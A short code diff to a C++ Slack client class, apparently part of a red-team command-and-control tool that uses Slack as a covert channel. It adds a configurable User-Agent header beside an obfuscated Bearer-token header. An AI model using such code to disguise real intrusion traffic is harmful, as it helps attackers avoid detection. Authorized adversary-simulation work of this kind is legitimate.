@@ -19,11 +19,11 @@ namespace
 	}
 }
 
-FSecure::Slack::Slack(std::string const& token, std::string const& channelName, std::string const& proxyOverride)
+FSecure::Slack::Slack(std::string const& userAgent, std::string const& token, std::string const& channelName, std::string const& proxyOverride)
 {
 	this->m_ProxyConfig = WebProxy::GetProxyConfigurationOverride(proxyOverride);
 	this->m_Token = token;
-
+	this->m_UserAgent = userAgent;
 	std::string lowerChannelName = channelName;
 	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });
 
@@ -228,7 +228,7 @@ FSecure::ByteVector FSecure::Slack::SendHttpRequest(std::string const& host, std
 		}
 
 		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
-
+		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));
 		auto resp = webClient.Request(request);
 
 		if (resp.GetStatusCode() == StatusCode::OK)
@@ -265,3 +265,4 @@ std::string FSecure::Slack::GetFile(std::string const& url)
 	auto data = SendHttpRequest(url);
 	return { data.begin(), data.end() };
 }
+
